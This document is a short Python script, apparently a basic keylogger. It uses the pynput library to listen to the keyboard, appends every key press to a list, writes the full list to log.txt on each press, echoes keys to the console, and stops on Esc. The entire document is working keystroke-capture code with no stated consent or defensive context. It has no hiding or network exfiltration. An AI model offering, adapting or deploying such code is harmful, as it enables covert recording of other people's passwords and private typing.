from pynput.keyboard import Key, Listener

keys = []

def on_press(key):

    keys.append(key)
    write_file(keys)

    try:
        print('{0} pressed'.format(key.char))

    except AttributeError:
        print('special key {0} pressed'.format(key))

def write_file(keys):

    with open('log.txt', 'w') as f:
        for key in keys:
            # rm ''
            k = str(key).replace("'", "")
            f.write(k)

            f.write(' ')

def on_release(key):

    print(' {0} released'.format(key))
    if key == Key.esc:
        # stop Listener
        return False

with Listener(on_press, on_release) as Listener:
    Listener.join()
